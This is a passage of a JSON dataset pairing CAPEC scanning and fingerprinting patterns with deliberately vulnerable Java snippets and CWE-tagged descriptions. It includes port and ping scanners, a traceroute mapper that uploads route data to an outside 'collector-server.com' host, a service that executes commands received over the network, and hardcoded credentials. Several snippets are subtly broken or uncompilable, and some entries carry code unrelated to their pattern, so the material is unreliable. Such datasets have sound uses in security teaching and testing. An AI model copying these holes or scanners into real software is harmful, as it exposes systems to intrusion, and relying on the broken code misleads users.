        "code_snippet": "public class NetworkScanner {\n    public static void scanNetwork(String networkRange) {\n        String[] ipRange = networkRange.split(\"/\");\n        String baseIP = ipRange[0];\n        int subnet = Integer.parseInt(ipRange[1]);\n        \n        try {\n            for(int i = 1; i < 255; i++) {\n                String host = baseIP.substring(0, baseIP.lastIndexOf(\".\") + 1) + i;\n                InetAddress address = InetAddress.getByName(host);\n                String hostname = address.getHostName(); // Relies on reverse DNS\n                \n                if(address.isReachable(1000)) {\n                    Socket socket = new Socket(host, 80);\n                    PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n                    out.println(\"PING \" + hostname); // Sends cleartext data\n                    \n                    // Store discovered hosts in plaintext file\n                    FileWriter fw = new FileWriter(\"discovered_hosts.txt\", true);\n                    fw.write(host + \":\" + hostname + \"\\n\");\n                    fw.close();\n                }\n            }\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code performs network scanning by attempting to ping IP addresses in a given range. It contains multiple security issues: it relies on reverse DNS lookup for host identification (CWE-350), transmits data in cleartext (CWE-319), stores sensitive network information in plaintext (CWE-200), and could be used as part of a worm's network propagation mechanism (CWE-509). The code also implicitly trusts IP addresses for host identification (CWE-291)."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "public class NetworkMapper {\n    public static void mapNetwork(String targetHost) {\n        try {\n            for (int ttl = 1; ttl <= 30; ttl++) {\n                Process process = Runtime.getRuntime().exec(\n                    \"tracert -h \" + ttl + \" \" + targetHost\n                );\n                \n                BufferedReader reader = new BufferedReader(\n                    new InputStreamReader(process.getInputStream())\n                );\n                \n                String line;\n                while ((line = reader.readLine()) != null) {\n                    // Store route information in plaintext\n                    FileWriter fw = new FileWriter(\"network_map.txt\", true);\n                    fw.write(line + \"\\n\");\n                    fw.close();\n                    \n                    // Send route data to external server without encryption\n                    URL url = new URL(\"http://collector-server.com/upload\");\n                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n                    conn.setDoOutput(true);\n                    conn.getOutputStream().write(line.getBytes());\n                }\n                reader.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable network mapping functionality that performs traceroute operations and exposes sensitive network topology information. It stores trace data in plaintext files and transmits it unencrypted to an external server. The code exhibits multiple vulnerabilities including cleartext transmission of sensitive data (CWE-319), exposure of system information (CWE-497), and improper management of trace data (CWE-1323)."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "public class ICMPAddressMaskServer {\n    public void handleICMPRequest(InetAddress clientAddress) {\n        try {\n            // Accept any ICMP request without authentication\n            if (clientAddress != null) {\n                // Expose sensitive network configuration\n                NetworkInterface ni = NetworkInterface.getByInetAddress(InetAddress.getLocalHost());\n                byte[] subnetMask = ni.getInterfaceAddresses().get(0).getNetworkPrefixLength();\n                InetAddress gateway = InetAddress.getByName(\"0.0.0.0\");\n                \n                // Send ICMP Address Mask Reply with sensitive information\n                ICMPPacket reply = new ICMPPacket();\n                reply.setType(18); // Address Mask Reply\n                reply.setData(new NetworkConfig(subnetMask, gateway, getBroadcastAddress()));\n                reply.send(clientAddress);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private InetAddress getBroadcastAddress() {\n        // Return network broadcast address without validation\n        return InetAddress.getByName(\"255.255.255.255\");\n    }\n}",
        "description": "This vulnerable code implements an ICMP Address Mask server that responds to Type 17 requests without proper authentication. It exposes sensitive network configuration including subnet masks, gateway addresses, and broadcast addresses. The code accepts connections from any IP address (0.0.0.0), doesn't validate the requestor's identity, and freely shares network topology information that could be used for network-based attacks."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "public class TimestampAuthenticator {\n    private static final String SECRET_KEY = \"mysecretkey123\";\n    \n    public boolean authenticateUser(String username, String timestamp, String signature) {\n        // Vulnerable timestamp-based authentication\n        long currentTime = System.currentTimeMillis();\n        long receivedTime = Long.parseLong(timestamp);\n        \n        // Generate authentication token using timestamp\n        String expectedSignature = generateSignature(username, timestamp);\n        \n        // Simple time window check (5 seconds)\n        if (Math.abs(currentTime - receivedTime) <= 5000) {\n            return signature.equals(expectedSignature);\n        }\n        return false;\n    }\n    \n    private String generateSignature(String username, String timestamp) {\n        return username + SECRET_KEY + timestamp;\n    }\n    \n    @GetMapping(\"/authenticate\")\n    public ResponseEntity<?> authenticate(@RequestParam String username,\n                                       @RequestParam String timestamp,\n                                       @RequestParam String signature) {\n        boolean isValid = authenticateUser(username, timestamp, signature);\n        return ResponseEntity.ok().body(isValid);\n    }\n}",
        "description": "This code demonstrates a vulnerable timestamp-based authentication system. It exposes timing information through a GET request, uses predictable timestamp-based token generation, and is susceptible to replay attacks within a 5-second window. The system leaks timing information through both the authentication mechanism and HTTP responses, creating potential timing side channels. The use of GET parameters for sensitive authentication data makes it vulnerable to URL logging and browser history exposure."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "public class ICMPInfoServer {\n    private DatagramSocket socket;\n\n    public void startServer() {\n        try {\n            socket = new DatagramSocket(7);\n            byte[] buffer = new byte[1024];\n\n            while (true) {\n                DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n                socket.receive(packet);\n\n                // Check if ICMP Information Request (Type 15)\n                if (buffer[0] == 15) {\n                    // Respond with system information without verification\n                    String sysInfo = System.getProperty(\"os.name\") + \",\" +\n                                   System.getProperty(\"os.version\") + \",\" +\n                                   InetAddress.getLocalHost().getHostName();\n                    \n                    byte[] response = sysInfo.getBytes();\n                    DatagramPacket responsePacket = new DatagramPacket(\n                        response,\n                        response.length,\n                        packet.getAddress(),\n                        packet.getPort()\n                    );\n                    socket.send(responsePacket);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code implements a vulnerable server that responds to ICMP Information Requests by sending sensitive system information in cleartext without proper authentication or verification. The server exposes OS details and hostname to any requesting client, demonstrating multiple vulnerabilities including exposure of sensitive information (CWE-200), cleartext transmission (CWE-319), and exposure of system information to unauthorized actors (CWE-497)."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "public class TCPPingScanner {\n    public static void scanHost(String targetHost) {\n        try {\n            Socket socket = new Socket();\n            socket.bind(new InetSocketAddress(0));\n            \n            // Create raw TCP packet with ACK flag\n            byte[] packet = new byte[20];\n            packet[13] = 0x10; // ACK flag\n            \n            // Send ACK packet without establishing connection\n            DatagramSocket rawSocket = new DatagramSocket();\n            DatagramPacket probe = new DatagramPacket(packet, packet.length,\n                InetAddress.getByName(targetHost), 80);\n            rawSocket.send(probe);\n            \n            // Listen for RST response\n            byte[] response = new byte[1024];\n            DatagramPacket replyPacket = new DatagramPacket(response, response.length);\n            rawSocket.receive(replyPacket);\n            \n            // Log host status in cleartext\n            String result = \"Host \" + targetHost + \" is alive\";\n            System.out.println(result);\n            \n            rawSocket.close();\n            socket.close();\n        } catch (Exception e) {\n            System.out.println(\"Host is not responding\");\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a TCP ACK ping scanner that attempts to determine if a remote host is alive by sending TCP segments with the ACK flag set and listening for RST responses. The code exposes sensitive host information (CWE-200), transmits data in cleartext (CWE-319), and could potentially interfere with other socket bindings (CWE-605). The error handling is not thread-safe (CWE-828) and could lead to race conditions in signal handling."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "public class UDPScanner {\n    public static void scanHost(String targetHost) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            socket.setSoTimeout(1000);\n            \n            // Create a UDP packet with empty data\n            byte[] data = \"ping\".getBytes();\n            DatagramPacket packet = new DatagramPacket(\n                data,\n                data.length,\n                InetAddress.getByName(targetHost),\n                65432  // High port number\n            );\n            \n            // Send UDP datagram\n            socket.send(packet);\n            \n            // Wait for ICMP response\n            byte[] receiveData = new byte[1024];\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n            \n            try {\n                socket.receive(receivePacket);\n                System.out.println(\"Host is alive: \" + targetHost);\n            } catch (SocketTimeoutException e) {\n                // No response means port is likely closed\n                System.out.println(\"Port unreachable - Host is alive: \" + targetHost);\n            }\n            \n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable UDP port scanner that attempts to detect if a host is alive by sending UDP datagrams to high ports and monitoring for ICMP responses. The code has multiple vulnerabilities including exposure of system information through error messages (CWE-200), cleartext transmission (CWE-319), and improper error handling that could reveal system details (CWE-1320). The scanner uses a fixed high port without proper destination verification (CWE-941)."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "public class VulnerableTCPServer {\n    public static void main(String[] args) {\n        try {\n            ServerSocket serverSocket = new ServerSocket(80);\n            ServerSocket duplicateSocket = new ServerSocket(80); // CWE-605: Multiple binds\n            \n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                \n                // No encryption for transmitted data (CWE-319)\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                \n                // Responding to SYN packets without validation\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    // No message integrity check (CWE-924)\n                    out.println(\"Server Status: ACTIVE\");\n                    out.println(\"System Info: \" + System.getProperty(\"os.name\") + \" \" + \n                               System.getProperty(\"os.version\")); // CWE-200: Information exposure\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a TCP server that exposes system information and allows multiple binds to the same port. It responds to all incoming connections without proper validation, potentially enabling TCP SYN scanning. The server transmits sensitive data in cleartext and lacks message integrity checks."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "public class VulnerableServer {\n    public static void main(String[] args) {\n        try {\n            // Bind multiple services to same port\n            ServerSocket server1 = new ServerSocket(8080);\n            ServerSocket server2 = new ServerSocket(8080);\n            \n            // Expose system information in cleartext\n            while(true) {\n                Socket client = server1.accept();\n                PrintWriter out = new PrintWriter(client.getOutputStream(), true);\n                \n                // Sending sensitive system info in cleartext\n                out.println(\"OS: \" + System.getProperty(\"os.name\"));\n                out.println(\"Java Version: \" + System.getProperty(\"java.version\"));\n                out.println(\"User: \" + System.getProperty(\"user.name\"));\n                \n                // Unsafe URL fetch based on client input\n                BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));\n                String url = in.readLine();\n                URL targetUrl = new URL(url);\n                URLConnection conn = targetUrl.openConnection();\n                BufferedReader urlContent = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                String line;\n                while ((line = urlContent.readLine()) != null) {\n                    out.println(line);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities: binding multiple sockets to the same port (CWE-605), transmitting sensitive system information in cleartext (CWE-319), exposing sensitive information to unauthorized actors (CWE-200), and implementing an SSRF vulnerability by fetching URLs based on user input without validation (CWE-918). The server exposes system information and allows port scanning through its responses."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "public class PortScanner {\n    public static boolean isPortOpen(String host, int port) {\n        try {\n            Socket socket = new Socket();\n            socket.connect(new InetSocketAddress(host, port), 1000);\n            \n            // Store sensitive connection info in plaintext log\n            String logMessage = \"Connection successful to \" + host + \":\" + port;\n            System.out.println(logMessage);\n            \n            // Authenticate based only on IP address\n            String clientIP = socket.getInetAddress().getHostAddress();\n            if(clientIP.startsWith(\"192.168.\")) {\n                allowAccess(clientIP);\n            }\n            \n            // Multiple binds without proper checks\n            ServerSocket serverSocket = new ServerSocket(port);\n            ServerSocket anotherSocket = new ServerSocket(port);\n            \n            socket.close();\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n    \n    private static void allowAccess(String ip) {\n        assert(ip != null) : \"IP cannot be null\";\n        // No integrity checks on data transmission\n        sendData(ip, \"sensitive_data\");\n    }\n    \n    private static void sendData(String ip, String data) {\n        // Data sent without any integrity verification\n    }\n}",
        "description": "This vulnerable code demonstrates a TCP port scanner that exposes multiple security issues: it leaks sensitive connection information, attempts multiple binds to the same port, relies solely on IP address for authentication, contains an exploitable assertion, and transmits data without integrity checks. The code allows an attacker to gather information about open ports and potentially exploit the system through these vulnerabilities."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "public class VulnerablePortScanner {\n    private static ServerSocket serverSocket;\n\n    public static void main(String[] args) {\n        try {\n            // Bind to multiple ports without security checks\n            serverSocket = new ServerSocket(80);\n            ServerSocket anotherSocket = new ServerSocket(80);\n\n            // Accept connections without verification\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                DataOutputStream out = new DataOutputStream(clientSocket.getOutputStream());\n\n                // Send sensitive data in cleartext\n                String sensitiveData = \"SECRET_KEY=12345\\nUSER_CREDENTIALS=admin:password\";\n                out.writeBytes(sensitiveData);\n\n                // No integrity checks on received data\n                byte[] buffer = new byte[1024];\n                clientSocket.getInputStream().read(buffer);\n\n                // Process data without verifying endpoint\n                processRequest(buffer);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void processRequest(byte[] data) {\n        // Process requests without authentication\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including binding multiple sockets to the same port, transmitting sensitive data in cleartext, lacking integrity checks for transmitted data, and failing to verify communication endpoints. The server accepts all incoming connections without proper verification, making it susceptible to TCP scanning attacks and unauthorized access."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "public class VulnerablePortScanner {\n    public static void scanPort(String targetHost) {\n        try {\n            Socket socket = new Socket();\n            byte[] xmasPacket = {\n                (byte)0xFF, // All flags set (FIN, SYN, RST, PSH, ACK, URG)\n                0x00,\n                0x00,\n                0x00\n            };\n            \n            socket.connect(new InetSocketAddress(targetHost, 80));\n            OutputStream out = socket.getOutputStream();\n            out.write(xmasPacket);\n            out.flush();\n            \n            // No integrity checks on response\n            InputStream in = socket.getInputStream();\n            byte[] response = new byte[1024];\n            int bytesRead = in.read(response);\n            \n            // Process response without verification\n            if (bytesRead > 0) {\n                System.out.println(\"Port is closed\");\n            }\n            \n            socket.close();\n        } catch (IOException e) {\n            System.out.println(\"Port is open\");\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a raw TCP XMAS scan implementation that sends malformed TCP packets with all flags set. It lacks proper integrity checks, transmits data in cleartext, and doesn't verify the authenticity of the endpoint. The code makes assumptions about port status based on raw responses without proper validation, potentially exposing system information to unauthorized actors."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "public class VulnerableNetworkScanner {\n    public static boolean checkPort(String host, int port) {\n        Socket socket = null;\n        try {\n            socket = new Socket();\n            socket.setReuseAddress(true);\n            \n            // Send raw TCP packet without proper flags\n            SocketImpl impl = socket.getImpl();\n            impl.create(true);\n            \n            // Transmit sensitive data in cleartext\n            String sensitiveData = \"SCAN_\" + System.getProperty(\"user.name\") + \"_\" + System.getProperty(\"os.version\");\n            byte[] data = sensitiveData.getBytes();\n            \n            // No integrity check for transmitted data\n            impl.connect(host, port);\n            impl.getOutputStream().write(data);\n            \n            // Unchecked NULL pointer usage\n            InputStream response = impl.getInputStream();\n            byte[] buffer = new byte[1024];\n            response.read(buffer);\n            \n            return true;\n        } catch (Exception e) {\n            return false;\n        } finally {\n            if(socket != null) {\n                try {\n                    socket.close();\n                } catch(IOException e) {}\n            }\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable network scanner that performs TCP NULL scanning by attempting to create raw socket connections. It contains multiple vulnerabilities including cleartext transmission of sensitive system information, lack of data integrity checks, potential NULL pointer dereferencing, and exposure of system information through error handling."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "public class NetworkScanner {\n    private ServerSocket serverSocket;\n    private boolean isRunning = true;\n\n    public void startServer() {\n        try {\n            serverSocket = new ServerSocket(80);\n            serverSocket.setReuseAddress(true);\n            \n            // Access control list stored in publicly accessible directory\n            File aclFile = new File(\"/public/firewall_rules.txt\");\n            BufferedReader reader = new BufferedReader(new FileReader(aclFile));\n            \n            while (isRunning) {\n                Socket clientSocket = serverSocket.accept();\n                \n                // Process TCP ACK packets without authentication\n                DataInputStream in = new DataInputStream(clientSocket.getInputStream());\n                byte[] packet = new byte[1024];\n                in.read(packet);\n                \n                // Respond with firewall configuration details in cleartext\n                String firewallConfig = \"ACL: ALLOW TCP/80; DENY UDP/443\";\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n                out.println(firewallConfig);\n                \n                // Check access permissions after sending data\n                if (!checkPermissions(clientSocket.getInetAddress())) {\n                    clientSocket.close();\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private boolean checkPermissions(InetAddress address) {\n        // Permission check occurs after data has been sent\n        return false;\n    }\n}",
        "description": "This vulnerable code demonstrates a network server that processes TCP ACK segments and exposes firewall configuration information. It contains multiple security issues: storing ACL files in a public directory, transmitting sensitive firewall configuration in cleartext, performing access control checks after data transmission, and allowing socket reuse that could lead to port stealing. The code enables network scanning through TCP ACK segments by responding with firewall configuration details to unauthenticated requests."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "public class NetworkInfoDisclosure {\n    public static void discloseTCPWindowInfo(String targetHost) {\n        try {\n            Socket socket = new Socket();\n            socket.setTcpNoDelay(true);\n            socket.setSoTimeout(1000);\n            \n            // Expose TCP Window size in cleartext\n            socket.setReceiveBufferSize(65535);\n            socket.connect(new InetSocketAddress(targetHost, 80));\n            \n            // Send raw TCP packets without encryption\n            OutputStream out = socket.getOutputStream();\n            String systemInfo = System.getProperty(\"os.name\") + \",\" +\n                              System.getProperty(\"os.version\") + \",\" +\n                              socket.getReceiveBufferSize();\n            out.write(systemInfo.getBytes());\n            \n            // No integrity checks on transmitted data\n            byte[] buffer = new byte[1024];\n            socket.getInputStream().read(buffer);\n            \n            // Timing-based information leak\n            Thread.sleep(socket.getReceiveBufferSize() % 100);\n            \n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates TCP Window scanning susceptibility by exposing TCP Window size, system information, and timing characteristics. It transmits sensitive data in cleartext, lacks integrity checks, and creates a potential covert timing channel through the sleep duration based on buffer size. The code reveals OS details and network configurations that could be exploited through TCP Window scanning techniques."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "public class RPCService {\n    private ServerSocket serverSocket;\n    private int rpcPort = 111; // Default RPC port\n\n    public void startRPCService() {\n        try {\n            serverSocket = new ServerSocket(rpcPort);\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                // Insecure: No authentication or validation\n                InputStream in = clientSocket.getInputStream();\n                ObjectInputStream ois = new ObjectInputStream(in);\n                // Directly deserialize and execute RPC commands\n                Object command = ois.readObject();\n                executeCommand(command);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void executeCommand(Object command) {\n        // Insecure: No validation of command origin or integrity\n        if (command instanceof String) {\n            Runtime.getRuntime().exec((String) command);\n        }\n    }\n}",
        "description": "This code demonstrates an insecure RPC service implementation that listens on a default RPC port and accepts connections without proper authentication. It contains multiple vulnerabilities: it exposes sensitive information through unencrypted communications (CWE-200), allows replay attacks due to lack of session management (CWE-294), executes remote commands without verification (CWE-494), and binds to a well-known port without proper security checks (CWE-605). The service also blindly executes commands received through RPC calls, making it vulnerable to unauthorized access and code execution."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "public class UDPScanner {\n    public static void scanPort(String target, int startPort, int endPort) {\n        try {\n            for (int port = startPort; port <= endPort; port++) {\n                DatagramSocket socket = new DatagramSocket();\n                byte[] data = \"SCAN\".getBytes();\n                DatagramPacket packet = new DatagramPacket(\n                    data,\n                    data.length,\n                    InetAddress.getByName(target),\n                    port\n                );\n                \n                socket.send(packet);\n                socket.setSoTimeout(1000);\n                \n                byte[] receiveData = new byte[1024];\n                DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n                \n                try {\n                    socket.receive(receivePacket);\n                    System.out.println(\"Port \" + port + \" is open\");\n                } catch (SocketTimeoutException e) {\n                    // Timeout means port might be open but not responding\n                    System.out.println(\"Port \" + port + \" might be open\");\n                }\n                \n                socket.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code implements a UDP port scanner that sends UDP datagrams to target ports without authentication or encryption. It exposes system information through cleartext transmission (CWE-319), lacks integrity checks (CWE-353), and potentially reveals sensitive port information (CWE-200). The code allows for timing-based analysis of responses (CWE-385) and doesn't implement proper port binding controls (CWE-605)."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "public class NetworkScanner {\n    public static void main(String[] args) {\n        try {\n            String logFile = \"/tmp/network_scan.log\";\n            FileWriter fw = new FileWriter(logFile, true);\n            \n            for (int i = 1; i <= 254; i++) {\n                String host = \"192.168.1.\" + i;\n                Process p = Runtime.getRuntime().exec(\"ping -c 1 \" + host);\n                BufferedReader br = new BufferedReader(\n                    new InputStreamReader(p.getInputStream()));\n                String line;\n                while ((line = br.readLine()) != null) {\n                    if (line.contains(\"time=\")) {\n                        String systemInfo = System.getProperty(\"os.name\") + \n                                          System.getProperty(\"user.name\") + \n                                          System.getProperty(\"java.version\");\n                        fw.write(\"Host: \" + host + \" is up. System: \" + systemInfo + \"\\n\");\n                    }\n                }\n            }\n            fw.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code performs network scanning and exhibits multiple security issues: it exposes sensitive system information by logging OS details and user information (CWE-200, CWE-497), stores scan results in an unprotected location (CWE-1323), implements no access controls for the scanning functionality (CWE-1292), and creates an excessive attack surface by scanning the entire subnet without restrictions (CWE-1125). The code performs network reconnaissance through ping commands and stores detailed system information in plaintext logs."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "public class NetworkService {\n    private ServerSocket serverSocket;\n    private static final String SYSTEM_INFO = \"OS: \" + System.getProperty(\"os.name\") +\n                                            \"\\nVersion: \" + System.getProperty(\"os.version\") +\n                                            \"\\nPath: \" + System.getProperty(\"java.home\");\n\n    public void startService() throws IOException {\n        serverSocket = new ServerSocket(21); // FTP port\n        while(true) {\n            Socket clientSocket = serverSocket.accept();\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n            \n            // Send system information in cleartext\n            out.println(\"Welcome to FTP Server\");\n            out.println(\"Server Info: \" + SYSTEM_INFO);\n            \n            // No authentication check\n            handleFTPCommands(clientSocket);\n        }\n    }\n\n    private void handleFTPCommands(Socket socket) {\n        // Process FTP commands without proper authentication\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            String command;\n            while((command = in.readLine()) != null) {\n                executeCommand(command); // No permission checking\n            }\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable network service implementation that exposes sensitive system information, lacks proper authentication, and transmits data in cleartext. It runs on a well-known port (FTP), making it easily discoverable through port scanning. The service freely provides system information to any connecting client and processes commands without proper authentication, creating an excessive attack surface."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "public class SystemDebugger {\n    private static final String DEBUG_LOG = \"/var/log/debug.log\";\n    private boolean isTestMode = false;\n\n    public void enableDebugInterface(String user) {\n        // No authentication check for debug interface access\n        isTestMode = true;\n        try {\n            // Direct hardware register access without privilege check\n            writeToRegister(0x1234, 0xFF);\n            FileWriter fw = new FileWriter(DEBUG_LOG, true);\n            fw.write(\"Debug mode enabled by \" + user + \"\\n\");\n            fw.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void writeToRegister(int address, int value) {\n        // Direct hardware access without protection\n        if((address >= 0x1000 && address <= 0x2000) || \n           (address >= 0x1800 && address <= 0x2800)) {\n            // Overlapping protected and unprotected memory ranges\n            unsafe_write(address, value);\n        }\n    }\n\n    private native void unsafe_write(int address, int value);\n}",
        "description": "This vulnerable code demonstrates multiple security issues related to debug interfaces and memory protection. It allows unauthorized access to debug features without proper authentication, writes sensitive information to debug logs, and contains overlapping memory ranges that could be exploited. The code also makes unsafe direct hardware access without proper access controls, potentially allowing attackers to manipulate protected memory regions."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "public class SystemInfoServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        response.setContentType(\"text/plain\");\n        PrintWriter out = response.getWriter();\n        \n        String osName = System.getProperty(\"os.name\");\n        String osVersion = System.getProperty(\"os.version\");\n        String javaVersion = System.getProperty(\"java.version\");\n        \n        out.println(\"Server Information:\");\n        out.println(\"OS: \" + osName);\n        out.println(\"OS Version: \" + osVersion);\n        out.println(\"Java Version: \" + javaVersion);\n        \n        String serverHeader = request.getHeader(\"Server\");\n        if (serverHeader != null) {\n            out.println(\"Server: \" + serverHeader);\n        }\n    }\n}",
        "description": "This vulnerable code exposes sensitive system information through a servlet endpoint. It reveals detailed operating system and runtime information in cleartext, making it easier for attackers to fingerprint the system. The code directly outputs OS name, version, and Java runtime details without any authentication or access control, violating security best practices for information disclosure."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "public class SystemInfoCollector {\n    private static final String LOG_FILE = \"/var/log/system.log\";\n    \n    public void logSystemInfo() {\n        try {\n            String osName = System.getProperty(\"os.name\");\n            String osVersion = System.getProperty(\"os.version\");\n            String osArch = System.getProperty(\"os.arch\");\n            String userHome = System.getProperty(\"user.home\");\n            \n            // Log system information in cleartext\n            FileWriter writer = new FileWriter(LOG_FILE, true);\n            writer.write(\"OS Name: \" + osName + \"\\n\");\n            writer.write(\"OS Version: \" + osVersion + \"\\n\");\n            writer.write(\"Architecture: \" + osArch + \"\\n\");\n            writer.write(\"User Home: \" + userHome + \"\\n\");\n            writer.write(\"Java Version: \" + System.getProperty(\"java.version\") + \"\\n\");\n            writer.close();\n            \n            // Send system info over network in cleartext\n            Socket socket = new Socket(\"monitoring.server.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(\"System-Info: \" + osName + \";\" + osVersion + \";\" + osArch);\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code collects and exposes sensitive system information in multiple ways. It logs system details including OS name, version, and architecture to an unprotected log file in cleartext. It also transmits this information over the network without encryption. The code doesn't implement any access controls or authentication mechanisms, making the sensitive system information accessible to unauthorized actors. Additionally, it creates persistent logs of system details that could be used for OS fingerprinting."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "public class SystemController {\n    private static final String DEBUG_LOG_PATH = \"/var/log/debug.log\";\n    private boolean isAuthorized = false;\n\n    public void processSystemTrace(String traceData, String userIP) {\n        // Insecure logging of sensitive trace data\n        try {\n            FileWriter fw = new FileWriter(DEBUG_LOG_PATH, true);\n            fw.write(\"Trace Data from \" + userIP + \": \" + traceData + \"\\n\");\n            fw.close();\n\n            // Vulnerable DNS-based authentication\n            String hostname = InetAddress.getByName(userIP).getHostName();\n            if(hostname.endsWith(\".trusted-domain.com\")) {\n                isAuthorized = true;\n            }\n\n            // Overlapping memory regions for protected/unprotected data\n            byte[] protectedRegion = new byte[1024];\n            byte[] unprotectedRegion = protectedRegion;\n            System.arraycopy(traceData.getBytes(), 0, unprotectedRegion, 0, traceData.length());\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including improper handling of trace data, insecure logging of sensitive information, reliance on DNS lookups for security decisions, and problematic memory management with overlapping protected/unprotected regions. The code writes sensitive trace data to an unprotected debug log file, uses DNS lookups for authentication, and creates overlapping memory regions that could lead to unauthorized access of protected data."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "public class AuthenticationService {\n    private static final String API_VERSION = \"2.0\";\n    private Map<String, String> tokenCache = new HashMap<>();\n    \n    public boolean authenticate(String token) {\n        // Vulnerable replay attack implementation\n        if (tokenCache.containsValue(token)) {\n            // Reused token is accepted without verification\n            return true;\n        }\n        \n        // Debug logging exposes sensitive information\n        System.out.println(\"DEBUG: Authenticating token: \" + token);\n        \n        // Non-ubiquitous API call that may not exist in all Java versions\n        String hostname = null;\n        try {\n            hostname = InetAddress.getLocalHost().getCanonicalHostName();\n            // Relies on DNS lookup for security decision\n            if (!hostname.endsWith(\".trusted-domain.com\")) {\n                return false;\n            }\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        }\n        \n        tokenCache.put(hostname, token);\n        return true;\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: authentication bypass through capture-replay attacks (CWE-294), reliance on DNS lookups for security decisions, usage of potentially non-ubiquitous APIs (CWE-589), and exposure of sensitive information through debug logging. The code allows token reuse, performs insecure DNS-based authentication, and logs sensitive authentication tokens."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
